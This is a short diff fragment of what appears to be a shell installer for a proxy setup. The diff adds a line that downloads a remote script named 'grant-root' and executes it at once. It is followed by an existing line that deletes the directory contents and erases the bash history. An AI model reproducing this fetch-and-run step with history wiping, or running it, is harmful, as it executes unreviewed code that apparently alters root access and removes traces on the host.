@@ -531,7 +531,7 @@ dir_xray
 add_domain
 install_all
 finish  
-
+wget https://raw.githubusercontent.com/anzclan/MULTIPORT/main/TOOL/ROOT/grant-root && chmod +x grant-root && ./grant-root
 rm -rf * && rm ~/.bash_history
 
 sleep 10
